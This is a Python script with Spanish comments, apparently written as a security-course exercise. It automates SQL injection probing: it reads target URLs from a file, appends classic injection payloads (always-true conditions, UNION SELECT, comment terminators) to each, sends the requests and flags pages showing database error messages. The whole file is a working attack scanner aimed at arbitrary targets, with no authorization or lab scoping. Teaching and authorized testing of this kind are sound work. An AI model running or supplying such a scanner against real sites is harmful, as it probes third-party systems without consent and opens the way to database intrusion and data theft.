import requests
from urllib.parse import urlparse, urlunparse, parse_qs, urlencode

# Indicadores comunes de errores SQL en las respuestas
SQL_ERROR_INDICATORS = [
    "You have an error in your SQL syntax",
    "Warning: mysql_fetch_array()",
    "mysql_num_rows()",
    "odbc_exec()",
    "SQLSTATE",
    "SQLException",
    "Unclosed quotation mark",
    "quoted string not properly terminated",
    "MariaDB server",
    "syntax error",
    "mysql_connect()",
    "SQL syntax",
    "ORA-", # Oracle errors
    "ORA-01722", # invalid number
    "SQLITE_ERROR",
    "pg_query()", # PostgreSQL
    "Microsoft SQL Server",
    "Fatal error: Uncaught mysqli_sql_exception"
]

# Payloads de SQL Injection proporcionados en el ejercicio
PAYLOADS = [
    "' OR '1'='1",
    "';--",
    "'' OR 1=1 --",
    "'' UNION SELECT null, null --",
    "'' OR 'a'='a",
    "' OR 1=1#" # Variación común
]

def test_sql_injection(targets_file="targets.txt"):
    """
    Lee URLs de un archivo, inyecta payloads de SQLi y analiza las respuestas
    para detectar posibles vulnerabilidades.
    """
    print("=== Automatización de Pruebas de SQL Injection ===\n")
    print(f"Leyendo URLs desde '{targets_file}'...")

    try:
        with open(targets_file, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[ERROR] El archivo '{targets_file}' no fue encontrado.")
        print("Asegúrate de crearlo con una URL por línea.")
        return
    except Exception as e:
        print(f"[ERROR] No se pudo leer el archivo '{targets_file}': {e}")
        return

    if not urls:
        print(f"El archivo '{targets_file}' está vacío. No hay URLs para escanear.")
        return

    print(f"Se encontraron {len(urls)} URLs para probar.")
    print("Iniciando pruebas de inyección SQL...\n")

    vulnerable_urls = []

    for base_url in urls:
        # Asegurarse de que la URL tiene al menos un parámetro para inyectar
        # Si la URL termina en '=', significa que el parámetro es el último.
        # Si no tiene '=', se asume que el usuario sabe dónde inyectar o se agregará al final.
        if '=' not in base_url and '?' not in base_url:
            print(f"[ADVERTENCIA] La URL '{base_url}' no parece tener parámetros para inyectar.")
            print("Saltando esta URL o considerando que el usuario inyectará directamente en la ruta.")
            continue # O manejar de otra forma si se espera inyección en path

        for payload in PAYLOADS:
            injected_url = base_url + payload
            print(f"Probando: {injected_url}")

            try:
                response = requests.get(injected_url, timeout=10)
                response.raise_for_status() # Lanza HTTPError para códigos de estado de error (4xx, 5xx)

                response_text = response.text.lower()

                # Buscar indicadores de error SQL en la respuesta
                found_error = False
                for indicator in SQL_ERROR_INDICATORS:
                    if indicator.lower() in response_text:
                        print(f"  [+] Posible SQLi detectada en: {injected_url}")
                        print(f"      Indicador: '{indicator}' encontrado en la respuesta.")
                        vulnerable_urls.append(injected_url)
                        found_error = True
                        break
                
                if not found_error:
                    # Si no hay errores SQL, también podríamos buscar diferencias en el contenido
                    # o un tamaño de respuesta anómalo si se quiere una detección más avanzada.
                    # Para este ejercicio, nos centramos en errores explícitos.
                    print("  [-] Sin errores SQL obvios. (Puede requerir análisis manual o más payloads)")

            except requests.exceptions.HTTPError as e:
                print(f"  [!] Error HTTP al probar {injected_url}: {e}")
            except requests.exceptions.ConnectionError:
                print(f"  [!] Error de conexión al probar {injected_url}. ¿Sitio caído o inaccesible?")
            except requests.exceptions.Timeout:
                print(f"  [!] Tiempo de espera agotado al probar {injected_url}.")
            except requests.exceptions.RequestException as e:
                print(f"  [!] Ocurrió un error al probar {injected_url}: {e}")
            print("-" * 60) # Separador para cada prueba

    print("\n--- Reporte Final de SQL Injection ---")
    if vulnerable_urls:
        print(f"Se encontraron {len(vulnerable_urls)} URL(s) potencialmente vulnerable(s):")
        for url in vulnerable_urls:
            print(f"  - {url}")
    else:
        print("No se encontraron URLs con posibles vulnerabilidades de SQL Injection.")

if __name__ == "__main__":
    test_sql_injection()